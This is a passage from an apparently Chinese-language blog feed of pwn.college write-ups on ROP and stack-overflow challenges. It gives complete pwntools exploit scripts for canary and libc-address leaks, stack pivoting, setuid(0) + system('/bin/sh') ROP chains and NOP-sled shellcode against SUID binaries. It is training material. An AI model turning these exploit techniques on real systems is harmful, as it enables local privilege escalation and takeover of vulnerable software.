class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>targetELF=<span class="hljs-string">&quot;/challenge/babyrop_level13.1&quot;</span><br>libcPath = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>],log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>ioHandler=process(targetELF)<br><span class="hljs-comment">#ioHandler=gdb.debug(targetELF,&quot;b *main+785&quot;)</span><br><br>offset=<span class="hljs-number">136</span><br><br><span class="hljs-comment">#/bin/sh字符串的偏移=0x1b45bd</span><br>binshOffset=<span class="hljs-number">0x1b45bd</span><br><br>elf=ELF(targetELF)<br>libc=ELF(libcPath)<br><br>gotAddr=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>pop_rdi_offset=<span class="hljs-number">0x23b6a</span><br>sysOffset=libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>setuidOffset=libc.symbols[<span class="hljs-string">&quot;setuid&quot;</span>]<br>binshOffset=<span class="hljs-number">0x1b45bd</span><br><br><br>ioHandler.recvuntil(<span class="hljs-string">&quot;[LEAK] Your input buffer is located at: &quot;</span>)<br>bufferStart=ioHandler.recvuntil(<span class="hljs-string">&#x27;.&#x27;</span>).decode()<br><span class="hljs-keyword">if</span> bufferStart[-<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;.&#x27;</span>:<br>    bufferStart=bufferStart[:-<span class="hljs-number">1</span>]<br>bufferStart=<span class="hljs-built_in">int</span>(bufferStart,<span class="hljs-number">16</span>)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;Address in hex to read from:&quot;</span>)<br>canaryAddr=bufferStart+offset-<span class="hljs-number">16</span><br>ioHandler.sendline(<span class="hljs-built_in">hex</span>(canaryAddr).encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br>ioHandler.recvuntil(<span class="hljs-string">&quot; = &quot;</span>)<br>canary=ioHandler.recv().decode()<br>canary=<span class="hljs-built_in">int</span>(canary,<span class="hljs-number">16</span>)<br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+p64(canary)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-number">0x2D</span>.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>ioHandler.send(payload1)<br><br><br><span class="hljs-comment">#回来了</span><br>ioHandler.recvuntil(<span class="hljs-string">&quot;[LEAK] Your input buffer is located at: &quot;</span>)<br>bufferAgain=ioHandler.recvuntil(<span class="hljs-string">&#x27;.&#x27;</span>).decode()<br><span class="hljs-keyword">if</span> bufferAgain[-<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;.&#x27;</span>:<br>    bufferAgain=bufferAgain[:-<span class="hljs-number">1</span>]<br>bufferAgain=<span class="hljs-built_in">int</span>(bufferAgain,<span class="hljs-number">16</span>)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;Address in hex to read from:&quot;</span>)<br>call_start=bufferAgain+offset<br>ioHandler.sendline(<span class="hljs-built_in">hex</span>(call_start).encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br>ioHandler.recvuntil(<span class="hljs-string">&quot; = &quot;</span>)<br>realCall_start=<span class="hljs-built_in">int</span>(ioHandler.recv().decode(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(realCall_start)<br>libcBase=realCall_start-<span class="hljs-number">0x24083</span>  <span class="hljs-comment">#为什么是24083，gdb看返回地址，最后3位是083，说明call main的指令偏移最后3位是083，再逆向libc.so，去里面找完整偏移??083，看到是24083</span><br><br>pop_rdiAddr=libcBase+pop_rdi_offset<br>sysAddr=libcBase+sysOffset<br>binshAddr=libcBase+binshOffset<br>setuidAddr=libcBase+setuidOffset<br><br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+p64(canary)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdiAddr)+p64(<span class="hljs-number">0</span>)+p64(setuidAddr)+p64(pop_rdiAddr)+p64(binshAddr)+p64(sysAddr)<br><br>ioHandler.send(payload2)<br>ioHandler.recv()<br><br>ioHandler.interactive()<br></code></pre></td></tr></table></figure><p><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-13/flag.png"><br>总结一下，这道题其实不难，但却卡了很久，主要是因为：<br><br>一方面不熟悉main函数的启动和退出机制，对libc.so共享文件不了解<br><br>另一方面还是在前面的题目中形成了思维定势，没有分清什么才是目的什么只是手段<br><br>其实真正的目的就是泄露libc基址，可以通过puts函数等程序运行时调用的函数泄露（如第4题），也可以像这题一样，利用给exit传参的指令地址泄露，减去偏移<br><br>总的来说，只要能拿到libc里某条指令的真实值和偏移，就能拿到libc基址，不应该拘泥于必须通过什么手段去泄露</p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>Program-Security</category>
      
      <category>ROP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>level-9</title>
    <link href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-9/"/>
    <url>/2025/07/20/pwn.college/Program-Securtity/ROP/level-9/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>需要我们用栈跃迁的方法去执行我们的ROP链<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>第一步依然是chekcsec，看到只开启了NX保护，说明要用ROP了<br><br>再用IDA逆向一下，看到在challenge函数中，会将输入存在0x4140E0的位置，并且只复制输入的前24个字节到缓冲区<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-9/challenge-IDA.png"><br>从这里就可以看出来，想把完整的ROP链布置到栈上是不可能了，因此漏洞点在于将启动ROP链的少部分代码写在最前面，通过启动代码把rsp的指向转移到完整的ROP链上<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先依然是ROPgadget命令获取必要碎片的地址，一般是pop rdi等传参需要的，参考<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/">pwn.college题解：ROP-level-4</a><br><br>最后，参考<a href="https://0x4a-210.github.io/2025/07/19/TogetherReview/Binary-Exp/">串联梳理：Pwn-Exp</a>中介绍的栈跃迁原理就可以写出下面的利用脚本：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>targetELF=<span class="hljs-string">&quot;/challenge/babyrop_level9.0&quot;</span><br>libc_path = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>offset=<span class="hljs-number">72</span>  <span class="hljs-comment">#9.0不需要了，直接拷贝到返回地址</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><br><br>p = process(targetELF)<br><span class="hljs-comment">#p=gdb.debug(targetELF,&quot;b *challenge+86&quot;)</span><br>elf=ELF(targetELF)<br>libc = ELF(libc_path)<br>rop = ROP(elf)<br><br>leave_addr=<span class="hljs-number">0x4016ab</span><br>pop_rbp_addr=<span class="hljs-number">0x40129d</span><br>pop_rdi_addr=<span class="hljs-number">0x401c33</span>  <span class="hljs-comment">#pop rdi ret的地址</span><br>ret =<span class="hljs-number">0x40101a</span>    <span class="hljs-comment">#rop.find_gadget([&#x27;ret&#x27;])[0]</span><br>gotAddr=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pltAddr=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br><span class="hljs-comment">#pop rbp，然后rbp需要=0x4140e0，然后leave+ret，即将rbp的值赋给rsp，然后pop rbp，最后pop rip</span><br><span class="hljs-comment">#为什么填0x4140f0：首先payload会被写到4140e0，加上为了栈迁移写的24个字节，按道理应该+0x18，但还要减去8，因为leave指令最后会pop一次rbp，即rsp+1，rsp要往下退一个内存格子</span><br><span class="hljs-comment">#这里正好退到0x4140f8，再把这个地址pop到rip（通过ret指令实现）</span><br>addrLeakPayload =p64(pop_rbp_addr)+p64(<span class="hljs-number">0x4140f0</span>)+p64(leave_addr)+p64(pop_rdi_addr)+p64(gotAddr)+p64(pltAddr)+p64(startAddr)<br><span class="hljs-comment">#addrLeakPayload = b&#x27;a&#x27;*offset + p64(pop_rdiAddr) + p64(gotAddr) +p64(ret)+p64(pltAddr) +p64(ret)+ p64(startAddr)</span><br><br>p.recv()<br>p.send(addrLeakPayload)<br>p.recvuntil(<span class="hljs-string">&quot;Leaving!\n&quot;</span>)<br>realAddr=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>libcBase=realAddr-<span class="hljs-number">0x84420</span><br><span class="hljs-comment">#system函数绝对地址</span><br>sysAddr = libcBase + <span class="hljs-number">0x52290</span>       <span class="hljs-comment">#libc.symbols[&#x27;system&#x27;] </span><br><span class="hljs-comment">#setuid函数绝对地址</span><br>setuidAddr = libcBase + <span class="hljs-number">0xe4150</span>    <span class="hljs-comment">#libc.symbols[&#x27;setuid&#x27;]</span><br><span class="hljs-comment">#binsh字符串绝对地址</span><br>binshAddr = libcBase + <span class="hljs-number">0x1b45bd</span>    <span class="hljs-comment">#next(libc.search(&quot;/bin/sh&quot;)) </span><br><br><span class="hljs-comment">#log.info(hex(sysAddr))</span><br><span class="hljs-comment">#log.info(hex(binshAddr))</span><br><br>shellPayload=p64(pop_rbp_addr)+p64(<span class="hljs-number">0x4140f0</span>)+p64(leave_addr)+ p64(pop_rdi_addr) + p64(<span class="hljs-number">0</span>) + p64(setuidAddr)  + p64(pop_rdi_addr) + p64(binshAddr) + p64(sysAddr)<br><br>p.recv()<br>p.send(shellPayload)<br>p.recv()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-9/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>Program-Security</category>
      
      <category>ROP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>level-4</title>
    <link href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/"/>
    <url>/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>需要我们构造ROP链来执行获取shell的代码段，进而拿到flag<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先还是checksec看到只开了NX，既然如此shellcode执行不了<br><br>接着拖到IDA里面发现并没有可以用的后门函数，因此只能采用ROP<br><br>然后找溢出点，发现在challenge函数<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-4/IDA-challenge.png"><br>再通过ROPgadget工具，看看程序本身有没有可用的碎片：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary /challenge/babyrop_level4.0 &gt;gadgets.txt<br></code></pre></td></tr></table></figure><p>在输出文件里找了一番，没发现system、binsh等可用的组件，只找到了勉强可以用来传参的pop rdi指令<br><br>那只能在libc里找一下看有没有system之类的函数：<br><br>首先确定程序链接的libc版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ldd /challenge/babyrop_level4.0<br></code></pre></td></tr></table></figure><p>可以看到是&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-4/ldd.png"><br>然后找相应的可用函数<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system<br>strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh<br></code></pre></td></tr></table></figure><p><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-4/find-in-libc.png"><br>如上图，这两条命令的输出都表示找到了我们想要的函数及其参数<br><br>因此漏洞点利用思路就比较清晰了，需要寻找libc中函数的地址（通过泄露Libc基址来实现），然后溢出返回地址到libc中<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>这道题目中需要返回到Libc中，因此首先需要知道libc的基地址，因此需要泄露一个libc中函数的真实地址来计算基地址<br><br>综上，构造一个两阶段的利用脚本，第一次泄露puts函数真实地址，并重新执行程序，第二次再发送真正的利用payload，拿到shell：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>targetELF=<span class="hljs-string">&quot;/challenge/babyrop_level4.0&quot;</span><br>libc_path = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>offset=<span class="hljs-number">56</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><br><br>p = process(targetELF)<br><span class="hljs-comment"># p=gdb.debug(targetELF,&quot;b *challenge&quot;)</span><br>elf=ELF(targetELF)<br>libc = ELF(libc_path)<br>rop = ROP(elf)<br><br>pop_rdiAddr=<span class="hljs-number">0x402204</span>  <span class="hljs-comment">#pop rdi ret的地址</span><br>ret =<span class="hljs-number">0x40101a</span>    <span class="hljs-comment">#rop.find_gadget([&#x27;ret&#x27;])[0]</span><br>gotAddr=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pltAddr=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br><br>addrLeakPayload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset + p64(pop_rdiAddr) + p64(gotAddr) + p64(pltAddr) + p64(startAddr)<br><br><span class="hljs-comment"># open(&quot;PayLoad&quot;,&quot;wb&quot;).write(addrLeakPayload)</span><br><br>p.recv()<br>p.send(addrLeakPayload)<br>p.recvuntil(<span class="hljs-string">&quot;Leaving!\n&quot;</span>)<br>realAddr=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>libcBase=realAddr-<span class="hljs-number">0x84420</span><br>sysAddr = libcBase + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]  <span class="hljs-comment">#system函数地址</span><br>setuidAddr = libcBase + libc.symbols[<span class="hljs-string">&#x27;setuid&#x27;</span>]<br>binshAddr = libcBase + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))  <span class="hljs-comment"># /bin/sh字符串地址</span><br><br>log.info(<span class="hljs-built_in">hex</span>(sysAddr))<br>log.info(<span class="hljs-built_in">hex</span>(binshAddr))<br><br>shellPayload= <span class="hljs-string">b&#x27;1&#x27;</span> * offset + p64(pop_rdiAddr) + p64(<span class="hljs-number">0</span>) + p64(setuidAddr) + p64(ret) + p64(pop_rdiAddr) + p64(binshAddr) + p64(ret) + p64(sysAddr)<br><br>p.recv()<br>p.send(shellPayload)<br>p.recv()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>大概解释一下脚本里的一些语句是什么意思（更详细的还得看pwntools的手册）<br><br>首先，主要的就是ELF类，通过传递一个ELF文件的路径，可以打开该文件，然后获得一个ELF对象（第10、11行分别拿到目标程序和libc.so的ELF对象）<br><br>通过该elf对象可以获取ELF文件中函数的plt表、got表（脚本中的gotAddr和pltAddr），以及函数符号表，即函数地址（如第18行获取_start函数的地址）<br><br>第一阶段，需要通过一个输出函数（如puts、printf）泄露got表地址，然后再回到程序的开始（即startAddr），所以第一阶段的payload（即addrLeakPayLoad）&#x3D;b’a’*offset + p64(pop_rdiAddr) + p64(gotAddr) + p64(pltAddr) + p64(startAddr)<br><br>泄露地址后通过减去puts函数的偏移得到libc基地址,即第29行（偏移可以通过readelf或者pwn库获得），最后，构造的shellPayload（第37行）才为真正getshell的payload<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-4/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>Program-Security</category>
      
      <category>ROP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>level-3</title>
    <link href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-3/"/>
    <url>/2025/07/20/pwn.college/Program-Securtity/ROP/level-3/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>题面很简单，提示我们了，需要使用ROP去触发一个多阶段的win函数</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>拖进IDA，看到溢出点发生在challenge函数，如图<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/IDA-challenge.png"><br>然后checksec看看开启了哪些保护<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/win-stage-1.png"><br>可以发现只开启了NX，不能自己写shellcode<br><br>接下来尝试寻找后门函数，注意到IDA逆向结果显示有5个win函数，基本可以猜测就是输出flag的后门函数，分别点进去分析源码，如下5张图所示<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/win-stage-1.png"><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/win-stage-2.png"><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/win-stage-3.png"><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/win-stage-4.png"><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/win-stage-5.png"><br>可以观察到每个函数只输出一部分flag，并且会检查参数是否等于stage编号<br><br>由此，结合题面提示，漏洞点就清晰了：利用溢出，构造ROP链，按顺序调用这5个win函数即可</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先，依然是确定偏移量，在IDA里可以直接读出来offset&#x3D;0x40+0x8&#x3D;0x48<br><br>接下来寻找可用的指令碎片（一般是找ret，以及如果是64位程序，还要找传参用的pop rdi; ret序列），通过ROPgadget工具：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary /challenge/babyrop_level3.1 &gt;gadgets.txt<br></code></pre></td></tr></table></figure><p>之后在gadgets.txt中搜索到ret指令和pop rdi指令：<br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/gadget.png"><br>可以看到我们想要的指令分别在0x402373和0x40101a<br>最后，分别找到5个win函数的地址，可以使用objdump工具，或者在IDA里看<br><br>由于没有开启PIE，上述找到的地址均可直接使用（即写死在脚本里）<br>有了以上信息，可以编写出如下利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> os<br>returnAddr1=<span class="hljs-number">0x402132</span><br>gadgetAddr=<span class="hljs-number">0x402373</span><br>returnAddr2=<span class="hljs-number">0x401f6c</span><br>returnAddr3=<span class="hljs-number">0x401da7</span><br>returnAddr4=<span class="hljs-number">0x40204c</span><br>returnAddr5=<span class="hljs-number">0x401e89</span><br>offset=<span class="hljs-number">72</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level3.1&quot;</span>)<br>payload=<span class="hljs-string">b&quot;a&quot;</span>*offset+p64(gadgetAddr)+p64(<span class="hljs-number">0x1</span>)+p64(returnAddr1)+p64(gadgetAddr)+p64(<span class="hljs-number">0x2</span>)+p64(returnAddr2)+p64(gadgetAddr)+p64(<span class="hljs-number">0x3</span>)+p64(returnAddr3)+p64(gadgetAddr)+p64(<span class="hljs-number">0x4</span>)+p64(returnAddr4)+p64(gadgetAddr)+p64(<span class="hljs-number">0x5</span>)+p64(returnAddr5)<br>p.recvuntil(<span class="hljs-string">&#x27;###\n&#x27;</span>)<br>p.send(payload)<br><span class="hljs-comment">#p.interactive()</span><br>output = p.recvall()<br><span class="hljs-built_in">print</span>(output.decode())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>Program-Security</category>
      
      <category>ROP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hijack-to-Shellcode</title>
    <link href="/2025/07/20/pwn.college/Intro-to-Cybersecurity/Pwn/Hijack-to-Shellcode/"/>
    <url>/2025/07/20/pwn.college/Intro-to-Cybersecurity/Pwn/Hijack-to-Shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>基础的栈溢出，在&#x2F;challenge目录下仅存在一个ELF文件，无源代码，需要我们构造输入劫持返回地址，根据题目名字能猜到是要劫持到shellcode起始地址</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>分析一个程序首先要分析有没有溢出点，溢出点在哪里。分析方法和上一题一致，这里省略<br><br>接下来用checksec看一下开了哪些保护<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/checksec.png"><br>发现保护全关，因此漏洞点就是缓冲区溢出覆写返回地址，劫持到我们的shellcode<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定偏移量，可以采用和<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/">pwn.college题解：Control-Hijack</a>相同的方法，最后计算得到偏移量&#x3D;120<br><br>第二步需要确定返回地址，即我们的shellcode的起始地址是哪，首先很自然想到将shellcode放在返回地址后面<br><br>通过gdb，在challenge函数的ret指令处打下断点，程序将停在ret指令之前，此时再次使用x命令查看$rsp，由于ret本质是进行pop rip操作，因此rsp此时指向的第一个内存格子就是返回地址,如下图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/ret-breakpoint.png"><br>从图中看到返回地址&#x3D;0x7fffffffd608，因此应该将返回地址覆写为0x7fffffffd610，但是不能这么干，因为这样gdb调试得到的返回地址其实是不准确的，因为gdb会引入一些环境变量导致栈的空间改变<br><br>在实战中，更多采用NOP滑行的方法，即在真正的shellcode之前填入若干个NOP指令，返回地址只要确定一个大概范围，最后能命中这些NOP里的任何一个即可，这里我选择的是0x7fffffffd660，在返回地址后面0x50个字节。<br><br>现在可以编写出如下的exp了<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> os<br>returnAddr=<span class="hljs-number">0x7fffffffd660</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;/challenge/binary-exploitation-hijack-to-shellcode&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>payload=<span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">120</span>+p64(returnAddr)+<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x200</span>+shellcode<br>p.recvuntil(<span class="hljs-string">&#x27;Send your payload (up to 4096 bytes)!\n&#x27;</span>)<br>p.send(payload)<br>p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="getshell的临门一脚"><a href="#getshell的临门一脚" class="headerlink" title="getshell的临门一脚"></a>getshell的临门一脚</h1><p>很遗憾，上述脚本实测无法打通，这是由于pwn.college的问题，子进程并没有继承root权限，导致读取&#x2F;flag文件时权限错误<br><br>至于为什么出现这种原因，怀疑是pwn.college服务器的sh是指向bash的，由于目标程序是通过SUID获得了root权限，而bash解释器默认会阻止SUID程序的子进程继承权限（不同于zsh等）。所以调用&#x2F;bin&#x2F;sh没有root<br><br>有2种办法解决，一个是在调用&#x2F;bin&#x2F;sh之前进行一次setuid(0)的操作，另一种是改一下shellcode，直接通过系统调用完成输出flag，我这题采用了后者<br><br>最终exp.py如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 